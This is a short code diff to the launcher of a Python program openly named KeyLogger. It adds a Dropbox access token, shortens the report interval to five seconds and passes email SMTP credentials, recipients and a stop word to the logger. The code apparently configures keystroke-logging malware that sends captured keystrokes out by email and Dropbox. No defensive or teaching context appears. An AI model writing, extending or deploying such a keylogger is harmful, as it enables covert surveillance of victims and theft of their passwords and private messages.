@@ -11,21 +11,24 @@ EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
 EMAIL_SENDER = os.getenv("EMAIL_SENDER")
 EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
 EMAIL_CC = os.getenv("EMAIL_CC")
-SEND_REPORT_EVERY = 15  # seconds
+DROPBOX_TOKEN = os.getenv("DROPBOX_TOKEN")
+
+SEND_REPORT_EVERY = 5  # seconds
 MAGIC_WORD = "STOP"
 
 
 def main():
     keylogger = KeyLogger(
-        SEND_REPORT_EVERY,
-        SMTP_SERVER,
-        SMTP_PORT,
-        EMAIL_ADDRESS,
-        EMAIL_PASSWORD,
-        EMAIL_SENDER,
-        EMAIL_RECEIVER,
-        EMAIL_CC,
-        MAGIC_WORD,
+        time_interval=SEND_REPORT_EVERY,
+        smtp_server=SMTP_SERVER,
+        smtp_port=SMTP_PORT,
+        email_address=EMAIL_ADDRESS,
+        email_password=EMAIL_PASSWORD,
+        email_sender=EMAIL_SENDER,
+        email_receiver=EMAIL_RECEIVER,
+        cc=EMAIL_CC,
+        magic_word=MAGIC_WORD,
+        dropbox_token=DROPBOX_TOKEN,
     )
     keylogger.run()
 
